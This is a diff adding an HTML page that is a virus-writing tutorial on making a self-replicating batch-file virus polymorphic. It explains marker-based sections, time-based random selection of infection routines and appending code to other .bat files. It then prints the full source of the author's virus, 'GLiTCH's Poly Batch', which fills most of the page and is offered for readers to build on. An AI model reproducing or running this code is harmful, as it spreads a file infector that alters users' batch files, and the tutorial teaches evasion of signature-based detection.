@@ -1,0 +1,315 @@
+<HTML>
+<HEAD>
+   
+   
+   <TITLE>Tutorials - Glitch's Polymorphic Batch</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><B><FONT COLOR="#004080"><FONT SIZE=+3>GLiTCH's Polymorphic Batch
+Tutorial</FONT></FONT></B>
+<BR><B><FONT COLOR="#004080"><FONT SIZE=+1>glitch0@usa.net</FONT></FONT></B></CENTER>
+
+<P>
+<HR WIDTH="100%">
+<P><B><FONT SIZE=+1>---== Introduction==---</FONT></B>
+<P>Well, first off, you have to think about the way you can make your batch
+virus polymorphic... Simple? Well, not quite. At the minute, there are
+two ways, the first I have seen quite a few times and use PKZIP and other
+compression engines as their "<A HREF="enginmen.htm">Mutation Engine</A>",
+then you get mine.. Totally batch scripting.
+<P>A quick note - If you intend to use my batch scripting method, try and
+keep your code size down, GPB was 7K at 0-generation and 6Mb at 10-generation!
+<P>I will only cover my method of polymorphism, because I have not generally
+played with "Mutation Engines" :)
+<P>Usually, when we say a virus is polymorphic, we think of the virus being
+encrypted with a random generator. This is NOT the only way, POLYMORPHIC
+means "Many Shapes" (as you should know by now!) and the bytes doen't literally
+have to change to be poly- morphic. In fact, I think viruses which use
+MtE, DAME, RTFM etc. should be called "Shape-Shifting" viruses, as they
+only change their bits, not structure.. GPB changed EVERY time, but stayed
+in its "readable" scripting.
+<P><B><FONT SIZE=+1>---== Theory ==---</FONT></B>
+<P>Okay, you decided on a polymophic batch using scripting only for compatability.
+Okay, As far as I'm aware, with present coding it's impossible to ENCRYPT
+batch scripting, I might work on code for this. So, to make it polymorphic,
+we're going to have to shift the virus around.
+<P>To do this, we're going to have to create sections in our code. Now
+remember, to copy the virus, you need a string that is in EVERY line. This
+rule can be bent slightly, by turning the string in to section markers..
+<P><B><FONT SIZE=+1>---== Implementation ==---</FONT></B>
+<P><B>--= example code =--</B>
+<PRE>        @echo off%[GPB_L0.BAT g]%
+        if not exist %0.BAT goto GPB_Exit
+        %[0.BAT g]%goto GPB_L3
+
+        :GPB_L3
+        for %%f in (%:GPB_L3%*.bat) do set GPB_File=%%f
+        %[:GPB_L3]%goto GPB_L5</PRE>
+In the above code, notice that EVERY line of the first section (Initialisation
+Routine) has the constant "0.BAT g", this was the marker I used to identify
+this routine. The second section had the marker ":GPB_L3".
+<P>So each and every routine needs an identifier. This is used to write
+each section in any desired order.
+<P><B>--= example code =--</B>
+<PRE>        :GPB_L8
+        %[:GPB_L8]%find /i "0.BAT g"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L3"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L5"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L7"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L8"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L9"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L10"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L11"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L12"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L13"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L14"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L15"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_L16"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%find /i ":GPB_Exit"&lt;%0.BAT>>%GPB_File%
+        %[:GPB_L8]%goto GPB_Exit</PRE>
+The above code is a one of my infection routines, you need a few for the
+polymorphism. In this routine, I append all the routines in order they
+were in the orginal code.
+<P><B>PROBLEM</B> - Because I use markers to identify sections, the markers
+HAVE to be in the infection routines, ALL of them. So this means when an
+infection occurs, these routines are appended to the end of each routine!
+<P>Okay, with this problem, there are 2 problems really -
+<OL>
+<LI>
+Size increases EVERY infection (if somebody can help me out with this,
+please EMail me!)</LI>
+
+<LI>
+It will try and copy contents to you file.</LI>
+</OL>
+The work-around for problem 2 is making sure you have a GOTO line at the
+end of each section like I have done.
+<P><B>PROBLEM</B> - Picking an infection routine
+<P>This was the first problem I thought about when creating the poly bat
+but was soon conqured, use the following line -
+<PRE>        %[section_marker]% echo. |time >000</PRE>
+This line writes the time to file 000 (change any names you want), also,
+the section marker can be ALMOST anywhere on the line. eg
+<PRE>        echo. |time >000 %[section_marker]%
+        echo. |%[section_marker]% time >000</PRE>
+Next you want to use the FIND command to LOOK for a number. I recommend
+adding the colons (:) to the number like I did, so there is a better chance
+of a more random number. Then use code like the following to pick out your
+random number and go to your desired infection routine -
+<PRE>        %[:GPB_L7]%find "0:" &lt;000>nul
+        %[:GPB_L7]%if errorlevel 1 goto GPB_L14</PRE>
+So generally, just patch lots of sections together and create infection
+routines to copy each section in a certain order. SIMPLE!
+<P><B><FONT SIZE=+1>---== Conclusion ==---</FONT></B>
+<P>Well, sorry if this didn't make much sense. I'm not a BATCH Queen! Yes,
+I did say QUEEN! Anyway, you should have written at least a normal Batch
+virus before you attempt a poly bat.
+<P>If you don't understand how it works etc. and want more help, just ask!
+I seem to be more helpful when directing my attention to somebody who gives
+me feedback, and I can help them thru the bits they struggle!
+<P>Well, Good Luck! I hope you can do better than mine! I wish I could
+get the size problem fixed! Oh well, back to Win32.Amoeba, and B00t (sector
+infector) ;P
+<P>Below is GPB's script.... Take care now...
+<BR> 
+<P><BR>
+<CENTER>
+<P><B>---== GLiTCH's Poly Batch Script ==---</B></CENTER>
+
+<BLOCKQUOTE>
+<PRE>@echo off%[GPB_L0.BAT g]%
+if not exist %0.BAT goto GPB_Exit
+%[0.BAT g]%goto GPB_L3
+
+:GPB_L3
+for %%f in (%:GPB_L3%*.bat) do set GPB_File=%%f
+%[:GPB_L3]%goto GPB_L5
+
+:GPB_L5
+find /i "GPB"&lt;%GPB_File%>nul %[:GPB_L5]%
+%[:GPB_L5]%if errorlevel 1 goto GPB_L7
+%[:GPB_L5]%goto GPB_Exit
+
+:GPB_L7
+%[:GPB_L7]%echo. |time >000
+%[:GPB_L7]%find "0:" &lt;000>nul
+%[:GPB_L7]%if errorlevel 1 goto GPB_L14
+%[:GPB_L7]%find "1:" &lt;000>nul
+%[:GPB_L7]%if errorlevel 1 goto GPB_L15
+%[:GPB_L7]%find "2:" &lt;000>nul
+%[:GPB_L7]%if errorlevel 1 goto GPB_L16
+%[:GPB_L7]%find "3:" &lt;000>nul
+%[:GPB_L7]%if errorlevel 1 goto GPB_L11
+%[:GPB_L7]%find "4:" &lt;000>nul
+%[:GPB_L7]%if errorlevel 1 goto GPB_L13
+%[:GPB_L7]%find "5:" &lt;000>nul
+%[:GPB_L7]%if errorlevel 1 goto GPB_L8
+%[:GPB_L7]%find "7:" &lt;000>nul
+%[:GPB_L7]%if errorlevel 1 goto GPB_L12
+%[:GPB_L7]%find "8:" &lt;000>nul
+%[:GPB_L7]%if errorlevel 1 goto GPB_L10
+%[:GPB_L7]%find "9:" &lt;000>nul
+%[:GPB_L7]%if errorlevel 1 goto GPB_L9
+%[:GPB_L7]%goto GPB_L7
+
+:GPB_L8
+%[:GPB_L8]%find /i "0.BAT g"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L3"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L5"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L7"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L8"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L9"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L10"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L11"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L12"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L13"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L14"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L15"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_L16"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%find /i ":GPB_Exit"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L8]%goto GPB_Exit
+
+:GPB_L9
+%[:GPB_L9]%find /i "0.BAT g"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L5"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L10"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L7"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L14"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L13"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L8"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L3"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L15"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L9"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L11"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L16"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_L12"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%find /i ":GPB_Exit"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L9]%goto GPB_Exit
+
+:GPB_L10
+%[:GPB_L10]%find /i "0.BAT g"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L11"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L5"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L14"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L8"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L13"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L15"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L16"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L10"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L9"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L12"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L3"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_L7"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%find /i ":GPB_Exit"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L10]%goto GPB_Exit
+
+:GPB_L11
+%[:GPB_L11]%find /i "0.BAT g"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L9"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L13"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L8"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L14"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L11"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L3"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L10"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L16"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L7"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L15"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L12"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_L5"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%find /i ":GPB_Exit"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L11]%goto GPB_Exit
+
+:GPB_L12
+%[:GPB_L12]%find /i "0.BAT g"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L13"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L14"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L5"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L12"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L7"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L16"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L11"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L8"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L10"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L9"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L15"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_L3"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%find /i ":GPB_Exit"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L12]%goto GPB_Exit
+
+:GPB_L13
+%[:GPB_L13]%find /i "0.BAT g"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L12"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L3"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L14"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L10"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L11"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L9"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L7"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L13"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L16"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L5"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L8"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_L15"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%find /i ":GPB_Exit"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L13]%goto GPB_Exit
+
+:GPB_L14
+%[:GPB_L14]%find /i "0.BAT g"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L12"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L3"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L10"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L11"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L9"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L7"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L15"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L13"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L16"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L5"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L14"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_L8"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%find /i ":GPB_Exit"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L14]%goto GPB_Exit
+
+:GPB_L15
+%[:GPB_L15]%find /i "0.BAT g"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L13"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L5"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L16"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L12"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L9"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L15"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L7"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L8"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L3"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L10"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L14"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_L11"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%find /i ":GPB_Exit"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L15]%goto GPB_Exit
+
+:GPB_L16
+%[:GPB_L16]%find /i "0.BAT g"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L16"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L7"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L14"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L10"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L8"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L3"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L12"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L15"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L5"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L9"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L13"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_L11"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%find /i ":GPB_Exit"&lt;%0.BAT>>%GPB_File%
+%[:GPB_L16]%goto GPB_Exit
+
+:GPB_Exit
+%[:GPB_Exit]%del 000</PRE>
+</BLOCKQUOTE>
+
+<HR WIDTH="100%">
+</BODY>
+</HTML>
